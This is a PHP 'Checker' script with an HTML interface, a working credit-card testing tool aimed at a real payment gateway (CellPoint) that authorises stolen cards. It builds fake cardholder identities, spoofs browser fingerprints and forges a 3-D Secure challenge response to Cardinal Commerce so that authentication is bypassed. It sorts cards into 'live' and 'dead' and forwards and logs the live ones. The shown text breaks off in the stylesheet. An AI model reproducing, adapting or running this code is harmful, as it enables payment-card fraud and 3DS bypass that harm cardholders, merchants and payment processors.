<?php
error_reporting(E_ERROR | E_PARSE);
!is_dir('C:\xampp\c') ? shell_exec('mkdir C:\xampp\c') : NULL;
$cookie = random(10);

// Name arrays for random passenger generation
$nameMc = ["Aaron","Adrian","Aiden","Aidric","Albert","Alfie","Alistair","Alonso","Alvin","Andy","Angelo","Aquinnah","Arellano","Aries","Arvin","Ash","Axel","Benjamin","Benny","Bernhard","Bryan","Caelan","Calgary","Calix","Cedric","Charlie","Christian","Crisanto","Cyler","Cyril","Daniel","Danilo","Dexter","Dranreb","Dream","Dwyn","Dylan","Eason","Elton","Ernest","Ernie","Ethan","Ethaniel","Euan","Eugene","Evan","Ezekiel","Faro","Felix","Fergus","Finn","Fraley","Gabriel","Galeno","Gavin","Genkei","Harlem","Harvey","Itzan","Jacob","Jaime","Jalen","James","Jayson","Jejomar","Jermaine","Jerome","Jess","Jiro","John Carlo","John Lloyd","John Mark","John Michael","John Paul","John Rey","Johnny","Jonas","Jonathan","Joshua","Juan","Justin","Justine","Kemp","Kenneth","Kyel","Kyle","Kylen","Lancel","Landis","Leroy","Luca","Lucas","Marco","Mark","Mark Anthony","Melchor","Miles","Morris","Mueller","Murphy","Nathan","Nathaniel","Nigel","Noah","Otto","Rafael","Ricardo","Riley","Rizalino","Rodrigo","Ryan","Ryuu","Shawn","Shayne","Shea","Skye","Sunday","Theo","Uhtred","Vern","Vin","Vince","Wayne","Wilfred","Xavier","Yuji","Zedhryx","Zion"];
$nameLast = ["dela Cruz","Garcia","Reyes","Ramos","Mendoza","Santos","Flores","Gonzales","Bautista","Villanueva","Fernandez","Cruz","de Guzman","Lopez","Perez","Castillo","Francisco","Rivera","Aquino","Castro","Sanchez","Torres","de Leon","Domingo","Martinez","Rodriguez","Santiago","Soriano","Delos Santos","Diaz","Hernandez","Tolentino","Valdez","Ramirez","Morales","Mercado","Tan","Aguilar","Navarro","Manalo","Gomez","Dizon","del Rosario","Javier","Corpuz","Gutierrez","Salvador","Velasco","Miranda","David","Salazar","Ferrer","Alvarez","Sarmiento","Pascual","Lim","Delos Reyes","Marquez","Jimenez","Cortez","Antonio","Agustin","Rosales","Manuel","Mariano","Evangelista","Pineda","Enriquez","Ocampo","Alcantara","Pascua","de Vera","Romero","de Jesus","dela Peña","Valencia","Ignacio","Vergara","Padilla","Angeles","Espiritu","Fuentes","Legaspi","Cañete","Peralta","Vargas","Cabrera","Fajardo","Gonzaga","Espinosa","Guevarra","Samson","Ortega","Molina","Serrano","Chavez","Briones","Medina","Palma","Tamayo","Arellano","Atienza","Villegas","Estrada","Martin","Acosta","Ortiz","Sison","Trinidad","Zamora","Asuncion","Abad","Moreno","Valenzuela","Mallari","Caballero","Villamor","Bernardo","Robles","Concepcion","Fernando","Gregorio","Borja","Magbanua","de Castro","Panganiban","Galang","Nuñez","Roxas","Ruiz","Pangilinan","Vicente","Chua","Suarez","Avila","Ali","Austria","Magno","dela Torre","Luna","de La Cruz","Pepito","Solis","Uy","dela Rosa","Duran","Abella","Mahinay","Esguerra","Roque","Andres","Jose","Sevilla","Beltran","Gabriel","Mateo","Ybañez","Nicolas","Mendez","Cunanan","Vasquez","Ancheta","Ventura","Lorenzo","Cordero","Toledo","Galvez","Abdul","Natividad","Marasigan","Herrera","Silva","Miguel","Gamboa","Estrella","Villa","Bartolome","Usman","Sales","Custodio","Ong","Lucero","Abdullah","Manzano","Ibañez","Marcelo","Ponce","Gallardo","Rosario","Delgado","Canlas","Cariño","Yap","Go","Esteban","Ilagan","Tuazon","Carpio","Carreon","Baltazar","Pablo","Lozada","Guzman","Guerrero","Padua","Salcedo","Camacho","San Juan","Bueno","Blanco","Cuevas","Carlos","Andaya","Lozano","Aguirre","Baguio","Cervantes","Bernal","Bustamante","Arevalo","Villar","Sabado","Labrador","Ronquillo","Panes","Cristobal","Prado","Guillermo","Dulay","Apostol","Oliveros","Santillan","Abalos","Quinto","Montero","Alfonso","Umali","Campos","Constantino","Baylon","Malinao","Franco","Calderon","Quijano","Velasquez","Marcos","Alonzo","Lazaro","Mata","Cinco","Geronimo","Cordova","Eugenio","Rubio","Viray","Delfin","Canoy","Crisostomo","Mejia","Rico","Punzalan","Benitez","Bernabe","Buenaventura","Ballesteros","Clemente","Sy","Peña","Jacinto","Vidal","Salas","Tomas","Matias","Yu","de Asis","Andrade","Magallanes","Roldan","Asis","Ledesma","Cortes","Feliciano","Sayson","de Luna","Borromeo","del Mundo","Bello","Manansala","Bondoc","Lacson","Salinas","Barrientos","Conde","Collado","Juan","Villareal","Teves","Laurente","Quiambao","Mohammad","Oliva","Bonifacio","Rojas","Alejandro","Sebastian","Frias","Catalan","Espina","Lee","Lucas","Sali","Dominguez","Mangubat","Calma","Chan","Villarin","Cayabyab","Rosal","Basa","Basilio","Tejada","Samonte","Viernes","Plaza","Gallego","Castor","Dionisio","Musa","Sultan","Tenorio","Solomon","Española","Narciso","San Jose","Pangan","Pelayo","Romano","Lachica","Arcilla","Alba","Espino","Raymundo","Pilapil","Cuizon","Aragon","Medrano","Ang","Guinto","Castañeda","Paras","Alvarado","Omar","Hipolito","Porras","de Mesa","Tecson","Basco","Pimentel","Adriano","Santa Ana","Sagun","Pacheco","Muñoz","Landicho","Arroyo","Rodrigo","Neri","Malabanan","Bravo","Lara","dela Cerna","Villaflor","Galicia","Junio","de Los Santos","Villaruel","Hilario","Añonuevo","Felipe","Montes","Gaspar","Belen","Sotto","Patricio","Bernardino","Madrid","Alarcon","Verano","Casas","Barrios","Ariola","Cano","Advincula","Marcelino","Macaraeg","Alejo","Andal","Dalisay","Aguila"];

$_SESSION['bG'] = [
  'useragent' => 'Mozilla/5.0 (Windows NT 6.1; '.random(6).') AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.'.mt_rand(100,9999).'.154 Safari/'.mt_rand(100,999).'.36 OPR/20.0.'.mt_rand(100,999).'.91',
];
$info = json_decode(R('https://randomuser.me/api/'), true);

extract(($i_ = [
  'n' => $info['results']['0']['name']['first'],
  'l' => $info['results']['0']['name']['last'],
  'email' => random(9) . '@gmail.com',
  'st' => $info['results']['0']['location']['street']['number']. ' '.$info['results']['0']['location']['street']['name'],
  'ct' => $info['results']['0']['location']['city'],
  'state' => $info['results']['0']['location']['state'],
  'country' => $info['results']['0']['location']['country'],
  'zip' => $info['results']['0']['location']['postcode'],
  'phn' => '9' . mt_rand(0, 999999999),
]));
extract($_GET);
//$card = '5363542091408444|12|2026';
if ($card) {
  extract(CC($card, 4));

  $type = $cc[0] == '4' ? '8' : ($cc[0] == '5' ? '7' : 'JCB');

  
  $proxy = null;
  $proxyuserpwd = null; 
  $retry = 0;
  retry:
$uuid = uuid();

$h = R('https://pop.cellpointdigital.net/views/web.php', [
  'postfields' => '',
  'httpheader' => [
    'Content-Type: application/x-www-form-urlencoded'
  ]
]);

$v = SS(G($h, '<script type="text/javascript">', '</script>'));
if(empty($v)){
goto retry;
}

$v['amount'].PHP_EOL;
$body = '{"country":640,"mobilecountry":640,"clientid":"'.$v['clientid'].'","account":"'.$v['account'].'","language":"en","orderid":"'.$v['orderid'].'","mobile":"'.$v['mobile'].'","operator":'.$v['operator'].',"email":"'.$v['email'].'","name":"Test Name","customerref":"'.$v['customerref'].'","accounts":"","markup":"HTML5","amount":"'.$v['amount'].'","fees":"'.$v['fees'].'","accepturl":"'.$v['accepturl'].'","cancelurl":"'.$v['cancelurl'].'","callbackurl":"'.$v['callbackurl'].'","orderdata":"'.addslashes($v['orderdata']).'}","sessionid":"","currency":608,"authtoken":"'.$v['authtoken'].'","deviceid":"","hmac":"'.$v['hmac'].'","additionaldata":"'.addslashes($v['additionaldata']).'","initToken":"'.$v['inittoken'].'","iframe":false,"nonce":"'.$v['nonce'].'","txntype":"1","locale":"","hppAppVersion":"2.0.0","logourl":"https://storage.googleapis.com/bkt-cp-prod-ehpp2/10077/logo.png","cssurl":"https://storage.googleapis.com/bkt-cp-prod-ehpp2/10077","assetsurl":"https://storage.googleapis.com/bkt-cp-prod-ehpp2/10077","profileid":"'.$v['profileid'].'","gtmdata":null,"gtmid":"'.$v['gtm-id'].'","responsecontenttype":"1","paymentgroupcode":null,"authversion":null,"jsonconvertedrequestdata":"'.addslashes(stripcslashes($v['jsonconvertedrequestdata'])).'","themeversion":null,"minifyversion":null,"timetoken":"'.$v['timetoken'].'","mitdata":null,"producttype":null,"flow":null,"mesbhost":"5j.velocity.cellpointmobile.net","surcharge":null}';

$s = sig($body);

$h = json_decode(R('https://pop.cellpointdigital.net/api/initialize', [
  'postfields' => $body,
  'httpheader' => [
    'Content-Type: application/json',
    'Token: '.$v['inittoken'],
    'Signature: '.$s['Signature'],
    'Key: '.$s['Key'],
    'Nonce: '.$v['nonce']
  ]
]), true);

$i = json_decode(R('https://pop.cellpointdigital.net/api/fxlookup', [
  'postfields' => '{"country":"640","clientid":"'.$v['clientid'].'","mobilecountry":"640","account":"'.$v['account'].'","orderid":"'.$v['orderid'].'","mobile":"'.$v['mobile'].'","operator":"'.$v['operator'].'","email":"'.$v['email'].'","language":"en","customerref":"'.$v['customerref'].'","accounts":"","markup":"HTML5","amount":"'.$v['amount'].'","transaction":"'.$h['transaction']['id'].'","currency":"PHP","decktoken":"'.base64_encode($cc).'","cardtypeid":"'.$type.'"}',
  'httpheader' => [
    'Content-Type: application/json',
  ]
]), true);

$payload = '{"cardname":"'.$n.' '.$l.'","decktoken":"'.base64_encode($cc).'","termination":"'.base64_encode($mm.'/'.$yyyy[2].$yyyy[3]).'","validfrom":"","cardtypeid":'.$type.',"paymenttype":false,"token":"","network":"","storecard":"false","accountconfirmpassword":"","accountpassword":"","accouontname":"","typeid":"10091","mitdata":null,"fxservicetypeid":"12","additionaldata":{"param":[{"name":"margin_percentage","text":"4.5"},{"name":"BrowserScreenHeight","text":542},{"name":"BrowserScreenWidth","text":360},{"name":"BrowserLanguage","text":"en-US"},{"name":"BrowserJavaEnabled","text":"false"},{"name":"BrowserJavascriptEnabled","text":true},{"name":"BrowserColorDepth","text":24},{"name":"BrowserTimeZoneOffset","text":-480},{"name":"UserAgent","text":"'.$_SESSION['bG'].'"},{"name":"BrowserScreenType","text":"mobile"},{"name":"BrowserOrientation","text":"portrait"}]},"cfxid":"'.$i['Offer']['foreign_exchange_offer_id'].'","amount":"'.$v['amount'].'","hmac":"'.$v['hmac'].'","currency":608,"paymentgroupcode":null,"country":640,"clientid":"'.$v['clientid'].'","mobilecountry":640,"account":"'.$v['account'].'","mobile":"'.$v['mobile'].'","operator":'.$v['operator'].',"email":"'.$v['email'].'","language":"en","customerref":"'.$v['customerref'].'","markup":"HTML5","profileid":"'.$v['profileid'].'","transaction":"'.$h['transaction']['id'].'","authtoken":"'.$v['authtoken'].'","billingaddress":{"fullname":"'.$n.' '.$l.'","email":"","address1":"'.$st.'","address2":"","street":"'.$st.'","countryid":"640","city":"'.$ct.'","state":"Biliran","postalcode":"'.rand(0, 9999).'","mobilecontrycode":640,"mobilenumber":"'.$v['mobile'].'","cardholderemail":"'.$v['customerref'].'","firstName":"'.$n.'","lastName":"'.$l.'","operatorid":"'.$v['operator'].'"},"cardid":"","checkouturl":"","euaid":"-1","mvault":"false","verifier":"","externalCall":"true","hppAppVersion":"2.0.0"}';

$s3 = sig($payload);

$j1 = json_decode(R('https://pop.cellpointdigital.net/api/authorize', [
  'postfields' => $payload,
  'httpheader' => [
    'Content-Type: application/json',
    'Signature: '.$s3['Signature'],
    'Key: '.$s3['Key'],
  ]
]), true);

$payload = '{"cardname":"'.$n.' '.$l.'","decktoken":"'.base64_encode($cc).'","termination":"'.base64_encode($mm.'/'.$yyyy[2].$yyyy[3]).'","validfrom":"","cardtypeid":'.$type.',"paymenttype":false,"token":"","network":"","storecard":"false","accountconfirmpassword":"","accountpassword":"","accouontname":"","typeid":"10091","mitdata":null,"fxservicetypeid":"12","additionaldata":{"param":[{"name":"margin_percentage","text":"4.5"},{"name":"BrowserScreenHeight","text":1056},{"name":"BrowserScreenWidth","text":962},{"name":"BrowserLanguage","text":"en-US"},{"name":"BrowserJavaEnabled","text":"false"},{"name":"BrowserJavascriptEnabled","text":true},{"name":"BrowserColorDepth","text":24},{"name":"BrowserTimeZoneOffset","text":-480},{"name":"UserAgent","text":"'.$_SESSION['bG'].'"},{"name":"BrowserScreenType","text":"desktop"},{"name":"BrowserOrientation","text":"portrait"}]},"deviceId":"'.uuid().'","collectionTime":'.rand(0, 9999).',"expired":"false","status":"true","message":"profile.completed","cfxid":"'.$i['Offer']['foreign_exchange_offer_id'].'","amount":"'.$v['amount'].'","hmac":"'.$v['hash'].'","currency":608,"paymentgroupcode":null,"country":640,"clientid":"'.$v['clientid'].'","mobilecountry":640,"account":"'.$v['account'].'","mobile":"'.$v['mobile'].'","operator":'.$v['operator'].',"email":"'.$v['email'].'","language":"en","customerref":"'.$v['customerref'].'","markup":"HTML5","profileid":"'.$v['profileid'].'","transaction":"'.$h['transaction']['id'].'","authtoken":"'.$v['authtoken'].'","billingaddress":{"fullname":"'.$n.' '.$l.'","email":"","address1":"'.$st.'","address2":"","street":"'.$st.'","countryid":"640","city":"'.$ct.'","state":"Agusan del Sur","postalcode":"'.rand(0, 9999).'","mobilecontrycode":640,"mobilenumber":"'.$v['mobile'].'","cardholderemail":"'.$v['customerref'].'","firstName":"'.$n.'","lastName":"'.$l.'","operatorid":"'.$v['operator'].'"},"cardid":"","checkouturl":"","euaid":"-1","mvault":"false","verifier":"","externalCall":"true","hppAppVersion":"2.0.0"}';

$s1 = sig($payload);

$j = json_decode(R('https://pop.cellpointdigital.net/api/authorize', [
  'postfields' => $payload,
  'httpheader' => [
    'Content-Type: application/json',
    'Signature: '.$s1['Signature'],
    'Key: '.$s1['Key'],
  ]
]), true);
$rawAmount = str_replace(',', '', trim((string)($v['amount'] ?? '0')));
$numericAmount = preg_replace('/[^\d.]/', '', $rawAmount);
$amountValue = is_numeric($numericAmount)
  ? (str_contains($numericAmount, '.') ? (float)$numericAmount : (float)$numericAmount / 100)
  : 0;
$amount = number_format($amountValue, 2, '.', '');

if($j['Code'] == '2005'){
  [$threeDsUrl, $JWT] = [G($j['body'], 'action=\'', '\''), G($j['body'], 'name=\'JWT\' value=\'', '\'')];
$stepUp = R($threeDsUrl, [
    'postfields' => 'JWT='.$JWT,
    'httpheader' => [
      'content-type: application/x-www-form-urlencoded',
    ]
  ]);
  if(str_contains($stepUp, 'acsUrl')) {
    [$acsUrl, $jwt_payload, $mcsId, $McsId] = [G($stepUp, 'name="acsUrl" value="', '"'), G($stepUp, 'name="payload" value="', '"'), G($stepUp, 'name="mcsId" value="', '"'), G($stepUp, 'name="McsId" id="redirect-mcsId" value="', '"')];
    $remove_message = json_decode(base64_decode($jwt_payload), true);
    // unset($remove_message['messageVersion']);
    // echo $re_enc_jwt = str_replace('==', '', base64_encode(json_encode($remove_message)));
    // echo $threeDs_url = R(htmlspecialchars_decode($acsUrl), [
    //   'postfields' => 'creq='.$jwt_payload.'&threeDSSessionData='.$mcsId,
    //   'httpheader' => [
    //     'Content-Type: application/x-www-form-urlencoded',
    //   ]
    // ]);
    // $cres = G($threeDs_url, 'name="cres" value="', '"');

    R('https://centinelapi.cardinalcommerce.com/V1/TermURL/2.0/CCA', [
      'postfields' => 'cres='.base64_encode('{"threeDSServerTransID":"'.$remove_message['threeDSServerTransID'].'","acsTransID":"'.$remove_message['acsTransID'].'","challengeCompletionInd":"Y","messageType":"CRes","messageVersion":"2.2.0","transStatus":"N"}').'&threeDSSessionData='.$mcsId,
      'httpheader' => [
        'Content-Type: application/x-www-form-urlencoded',
      ]
    ]);

  $TermRedirection = R('https://centinelapi.cardinalcommerce.com/V1/Cruise/TermRedirection', [
    'postfields' => 'McsId='.$McsId.'&CardinalJWT=&Error=', 
    'httpheader' => [
      'Content-Type: application/x-www-form-urlencoded',
    ]
  ]);
  $TransactionId = G($TermRedirection, 'name="TransactionId" value="', '"');
  if(empty($TransactionId)){
    goto retry;
}
  $threedsRedirect = R('https://5j.velocity.cellpointmobile.net/mpi/cybersource/threed-redirect', [
    'header' => 1,
    'followlocation' => 1,
    'postfields' => 'TransactionId=' . $TransactionId . '&Response=&MD=null',
    'httpheader' => [
      'Content-Type: application/x-www-form-urlencoded',
    ]
  ]);
  [$code, $sub_code, $location] = [G($threedsRedirect, 'code=', '&'), G($threedsRedirect, 'sub_code=', "\n"), G($threedsRedirect, 'Location: ', "\n")];
  if($code == '2000' && $sub_code == '2000101'){
    $json = json_encode(array_merge([
    'transactionId' => $h['transaction']['id'],
    'clientId' => '10077',
    'pollingTimeout' => '30',
    'minPollingInterval' => '1',
    'maxPollingInterval' => '10',
    'secure' => 'false',
    'token' => $v['timetoken'],
    'sessiontime' => '13'
], $h['secured_data']));

    $paymentCompleted = json_decode(R('https://pop.cellpointdigital.net/api/paymentcomplete', [
      'postfields' => $json,
      'httpheader' => [
        'Content-Type: application/json',
        'Referer: '.$location,
        'Origin: https://pop.cellpointdigital.net',
      ]
    ]), true);
    ($paymentCompleted);
     $sessionCompleted = R('https://pop.cellpointdigital.net/api/sessioncomplete', [
      'postfields' => json_encode(array_merge([
    'transactionId' => $h['transaction']['id'],
    'clientId' => $v['clientid'],
    'pollingTimeout' => '30',
    'minPollingInterval' => '1',
    'maxPollingInterval' => '10',
    'sessionId' => $paymentCompleted['session_id'],
    'mode' => '1',
    'secure' => 'false',
    'statusCode' => $paymentCompleted['status_code'],
    'token' => $v['timetoken'],
    'sessiontime' => '13'
], $h['secured_data'])),
      'httpheader' => [
        'Content-Type: application/json',
        'Referer: '.$location,
        'Origin: https://pop.cellpointdigital.net',
      ]
    ]);
     R($paymentCompleted['url'], [
      'postfields' => 'transaction_id='.$paymentCompleted['transaction_id'].'&transaction_status=1&order_id='.$paymentCompleted['order_id'].'&amount='.$paymentCompleted['amount'].'&state_id=2001&sign='.$paymentCompleted['sign'].'&session_id='.$paymentCompleted['session_id'].'&currency=608&decimals=2&payment_method=Card&card_name='.$paymentCompleted['card_name'].'&masked_card='.$paymentCompleted['masked_card'].'&approval_code='.$paymentCompleted['approval_code'].'&psp_name=CyberSource&fraud_status_code='.$paymentCompleted['fraud_status_code'].'&fraud_status_desc='.$paymentCompleted['fraud_status_desc'].'&'.http_build_query($paymentCompleted['additional_data']).'&expiration_date='.$mm.'%2F'.substr($yyyy, 2, 2).'&first_name='.$n.'&last_name='.$l.'&street_address='.urlencode($st).'&city='.$ct.'&country=Philippines&country_alpha2code=PH&province=Agusan+del+Norte&postal_code='.rand(0, 9999).'&email='.urlencode($v['customerref']).'&mobile_number='.$phn.'&dialing_country_code=63&psp_ref_id='.$paymentCompleted['psp_ref_id'].'&date_time='.urlencode($paymentCompleted['date_time']).'&ip_address='.$paymentCompleted['ip_address'],
      'httpheader' => [
        'Content-Type: application/x-www-form-urlencoded',
        'Origin: https://pop.cellpointdigital.net',
        'Referer: https://pop.cellpointdigital.net/',
      ]
    ]);
    return RESULT('live', 'Payment Authorised! - Amount: '.$amount. ' - Itinerary: '.$itinerary['recordLocator']);
  }
  return RESULT('dead', $code . ' - '.$sub_code);
  }
}


if ($d->result == 'success') forwardersd('Live Card ' . $card, 122072293091) & file_put_contents('avs.txt', $card . PHP_EOL, FILE_APPEND | LOCK_EX);

$d->result == 'success' ? RESULT('live', 'Payment Approved!') : RESULT('dead', trim(preg_replace('/\s+/', ' ', strip_tags(stripslashes($d->messages)))));
}

function uuid($data = null) {

    $data = $data ?? random_bytes(16);
    assert(strlen($data) == 16);

    $data[6] = chr(ord($data[6]) & 0x0f | 0x40);
    $data[8] = chr(ord($data[8]) & 0x3f | 0x80);

    return vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex($data), 4));
}

function randomDate($startYear, $endYear) {
    $year = rand($startYear, $endYear);
    $month = str_pad(rand(1, 12), 2, '0', STR_PAD_LEFT);
    $day = str_pad(rand(1, 28), 2, '0', STR_PAD_LEFT);
    return "$year-$month-$day";
}

function computed_hash(string $uniqueId, string $requestPath, string $nonce, string $authorization, string $bodySecretKey): string {
    if ($requestPath === '' || $requestPath[0] !== '/') {
        $requestPath = '/' . $requestPath;
    }
    $data = $uniqueId . $requestPath . $nonce . $authorization;
    $raw = hash_hmac('sha256', $data, $bodySecretKey, true);
    return base64_encode($raw);
}

function sig($body, $key = null) {
    $key = $key ?: (string) round(microtime(true) * 1000);
    $message = is_array($body) ? json_encode($body, JSON_UNESCAPED_SLASHES) : $body;
    $signature = hash_hmac('sha512', $message, $key);

    return [
        'Signature' => $signature,
        'Key'       => $key
    ];
}

function g(string $str, string $start, string $end, bool $decode = false)
{
  return $decode ? base64_decode(explode($end, explode($start, $str)[1])[0]) : explode($end, explode($start, $str)[1])[0];
}

function SS($a) {
    preg_match_all("/sessionStorage\.setItem\('([^']+)',\s*'([^']*)'\)/", $a, $m);
    return array_combine($m[1], $m[2]);
}

function encrypt($authorization, $xAuthToken, $payload) {
    $park = 'VwxG&vJSrS-3*?7z';
    $passphrase = $authorization . $xAuthToken . $park;

    $salt = openssl_random_pseudo_bytes(8);
    $salted = "Salted__" . $salt;

    $data = $passphrase . $salt;
    $md5 = md5($data, true);
    $key = $md5;
    while (strlen($key) < 48) {
        $md5 = md5($md5 . $data, true);
        $key .= $md5;
    }
    $aesKey = substr($key, 0, 32);
    $aesIV = substr($key, 32, 16);

    $cipherText = openssl_encrypt($payload, 'aes-256-cbc', $aesKey, OPENSSL_RAW_DATA, $aesIV);
    $base64Cipher = base64_encode($salted . $cipherText);

    $base64Cipher = insertRandom($base64Cipher, $authorization);
    $base64Cipher = insertRandom($base64Cipher, $xAuthToken);

    return $base64Cipher;
}

function insertRandom($str, $token) {
    $idx = random_int(0, strlen($str));
    return substr($str, 0, $idx) . $token . substr($str, $idx);
}

function R($u, $p = [], $t = 0)
{
    global $cookie, $proxy, $proxyuserpwd;
    if (!$p) $p[l('customrequest')] = 'GET';
    else foreach ($p as $n => $s) {
        $p[l($n)] = $s;
        unset($p[$n]);
    }
    $p[l('returntransfer')] = 1;
    $proxy && $p[l('proxy')] = $proxy;
    $proxyuserpwd && $p[l('proxyuserpwd')] = $proxyuserpwd;
    foreach ($_SESSION['bG'] as $E => $N) {
        $p[l($E)] = $N;
    }

    $c = 'C:\xampp\c/' . $t . '_' . $cookie . '.txt';
    $p[10031] = $c;
    $p[10082] = $c;


    curl_setopt_array(($c = curl_init($u)), $p);
    $e = curl_exec($c);

    curl_close($c);
    return $e;
}

function error_message($code, $sub_code)
{
    $codes = [
        '2004' => 'Card not enrolled',
        '2005' => '3DS authentication required',
        '2006' => '3DS authentication success',
        '2010' => 'Rejected',
        '2011' => 'Declined',
        '2016' => '3DS authentication failed',
        '2017' => 'Authorization not attempted due to rule',
        '4020' => 'Session failed',
        '4021' => 'Session failed',
        '4030' => 'Session complete',
        '4031' => 'Session partial',
        '20109' => 'Rejected sub state on timeout',
        '20108' => 'Rejected sub state on timeout',
    ];

    $sub_codes = [
        '2010101' => 'The amount is invalid.',
        '2010000' => 'Unknown error',
        '2010102' => 'Card number is invalid.',
        '2010103' => 'Installment field value is invalid.',
        '2010104' => 'Invalid order number value',
        '2010105' => 'Missing mandatory fields or data is not present',
        '2010106' => 'Invalid MerchantId',
        '2010107' => 'Invalid TransactionId',
        '2010108' => 'Invalid transaction date',
        '2010109' => 'Invalid CVC or CVN',
        '2010110' => 'Invalid payment type',
        '2010111' => 'Invalid expiry date',
        '2010112' => 'Invalid 3DS secure values',
        '2010113' => 'Invalid card type',
        '2010114' => 'Invalid request version',
        '2010115' => 'Return URL is not set.',
        '2010116' => 'Invalid currency code.',
        '2010117' => 'Invalid promotion.',
        '2010118' => 'Invalid token.',
        '2010201' => 'Invalid access credentials',
        '2010202' => 'Invalid PIN or OTP',
        '2010203' => 'Insufficient funds or over credit limit',
        '2010204' => 'Expired card',
        '2010205' => 'Unable to authorize',
        '2010206' => 'Exceeds withdrawal count limit OR authentication requested',
        '2010207' => 'Do not honor',
        '2010208' => 'Transaction not permitted to user',
        '2010301' => 'Internal error / general system error',
        '2010302' => 'Parse error / invalid Request',
        '2010303' => 'Service not available.',
        '2010304' => 'Time out',
        '2010305' => 'Payment is cancelled / Payment reversed',
        '2010306' => 'Waiting for upstream response',
        '2010307' => 'No routing available',
        '2010308' => 'System DB error',
        '2010309' => 'Invalid operation / operation rejected',
        '2010310' => 'Transaction already in progress / duplicate transaction / duplicate order number',
        '2010311' => 'Endpoint not supported',
        '2010312' => 'Transaction not permitted to terminal',
        '2010313' => 'Invalid merchant account / configuration / API permission missing',
        '2010314' => 'Transaction rejected by issuer / authorization failed / transaction failed',
        '2010315' => 'EMI not available',
        '2010316' => 'Void not supported',
        '2010317' => 'Already captured',
        '2010318' => 'Retry limit exceeded',
        '2010319' => 'Invalid capture attempted / capture amount exceeds approved amount',
        '2010320' => 'Transaction not posted',
        '2010321' => 'Recurring payment not supported',
        '2010322' => 'Stored card option is disabled.',
        '2010323' => 'Request authentication failed.',
        '2010324' => 'Unable to decrypt request.',
        '2010325' => 'Transaction ID / EP generation failed',
        '2010326' => 'Installment payment is disabled.',
        '2010327' => 'Ticket issue failed',
        '2010328' => 'Sign-in failed',
        '2010329' => 'Card type is not allowed.',
        '2010330' => 'Issuing bank unavailable.',
        '2010331' => 'Transaction exceeds the approved limit',
        '2010332' => 'Cannot void as capture or credit is submitted',
        '2010333' => 'Cannot refund as you requested a credit for a capture that was previously voided.',
        '2010334' => 'Credit amount exceeds maximum allowed for your merchant account.',
        '2010401' => 'FRAUD Suspicion / Rejected',
        '2010402' => 'Address verification failed',
        '2010403' => 'Card acceptor should contact acquirer / Issuing bank has questions about the request',
        '2010404' => 'Security violation',
        '2010405' => 'Card is blocked due to fraud',
        '2010406' => '3D secure authentication failed',
        '2010407' => 'Fraud, stolen or lost card',
        '2010408' => 'Compliance ERROR',
        '2010409' => 'Transaction previously declined',
        '2010410' => 'E-commerce declined',
        '2010411' => 'Card restricted',
        '2010412' => 'Card function not supported',
        '2010413' => 'Physical card error',
        '2010414' => 'BIN check failed',
        '2010415' => 'Validation check failed.',
        '2010416' => 'CVN did not match',
        '2010417' => 'The customer matched an entry on the processor’s negative file.',
        '2010418' => 'Strong customer authentication (SCA) is required for this transaction.',
        '2010419' => 'Authorization request was approved by the issuing bank but declined by gateway or processor.',
    ];

$main = $codes[$code] ?? '';
$sub  = $sub_codes[$sub_code] ?? '';

return trim("$code - $main" . ($sub ? " : $sub_code - $sub" : ""));

}

function l($a)
{
  return eval('return CURLOPT_' . strtoupper($a) . ';');
}

function CC($card, $validYYYY = 2)
{
  list($cc, $mm, $yyyy, $cvv) = explode('|', $card);
  $yyyy = strlen($yyyy) === 4 ? ($validYYYY === 2 ? substr($yyyy, 2) : $yyyy) : (strlen($yyyy) === 2 ? ($validYYYY === 4 ?  '20' . $yyyy : $yyyy) : exit('INVALID EXP YEAR'));
  return [
    'cc' => $cc,
    'mm' => $mm,
    'yyyy' => $yyyy,
    'cvv' => $cvv
  ];
}
function random($l)
{
  $ch = implode('', range('a', 'z')) . implode('', range('A', 'Z'));
  $chs = strlen($ch);
  $str = '';
  for ($i = 0; $i <= $l; $i++) {
    $str .= $ch[mt_rand(0, $chs)];
  }
  return $str;
}

function REMOVE_COOKIE()
{
  foreach (glob('C:\xampp\c/*.txt') as $int => $value) {
    if (is_file($value)) {
      unlink($value);
    }
  }
}

function BB($f, $e = '>', $s = ["'", "'"])
{
  foreach (explode($e, $f) as $o) {
    $dd[g($o, "name={$s[0]}", $s[0])] = g($o, "value={$s[1]}", $s[1]);
  }
  unset($dd['']);
  // unset($dd['submit']);
  return http_build_query($dd);
}

function RESULT($d, $r)
{
  REMOVE_COOKIE();
  echo json_encode([
    'cards' => '<div id="rslt" class="rslt ' . $d . '">' . $_GET['card'] . '<hr></div>',
    'result' => '<div id="rslt" class="rslt ' . $d . '">' . $r . '<hr></div>'
  ]);
  exit;
}

?>
<html>
<head>
  <!--------seisachtheia------>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Nanum+Gothic:wght@400;700;800&display=swap" rel="stylesheet">
  <title>Checker</title>
  <style>
    * {
      box-sizing: border-box;
    }
    body {
      color: #fff;
      background-color: black;
      margin: 0;
      font-family: 'Nanum Gothic', sans-serif;
    }
    .main {
      max-width: 80%;
      width: 80%;
      padding: 10px;
      margin: 0 auto;
    }
    .card > textarea {
      text-align: center;
      color: #fff;
      background: black;
      border-radius: 10px;
      width: 100%;
      height: 135px;
    }
    hr {
      border: 0.1% solid white;
      opacity: 0.3;
    }
    header h1 {
      text-align: center;
    }
    .status {
      margin-top: 10px;
      display: flex;
      justify-content: space-between;
    }
    .tkn {
      margin-right: 10px;
      height: 120px;
      width: 40%;
      border: 1px solid white;
      border-radius: 10px;
    }
    .sts {
      margin-left: 10px;
      height: 120px;
      width: 40%;
      font-size: 15px;
      border: 1px solid white;
      border-radius: 10px;
    }
    .main > p {
      text-align: center;
    }
    .decision {
      width: 40%;
    }
    .display {
      display: flex;
      align-items: flex-start;
      max-width: 100%;
      width: 80%;
      padding: 10px;
      margin: 0 auto;
      margin-top: 10px;
    }
    .decision > button {
      width: 100%;
      height: 50px;
      background: black;
    }
    .btn-1 {
      border-radius: 8px;
      font-size: 1.5rem;
      color: rgb(0, 128, 0);
    }
    .btn-1, .btn-2 {
      transition: all ease 0.2s;
    }
    .btn-2 {
      border-radius: 8px;
      margin-top: 20px;
      font-size: 1.5rem;
      color: rgb(255, 0, 0);
    }
    button:hover {
      box-shadow: inset 500px 0 0 0 #F5FFFA;
    }
    .column {
      margin: 10px;
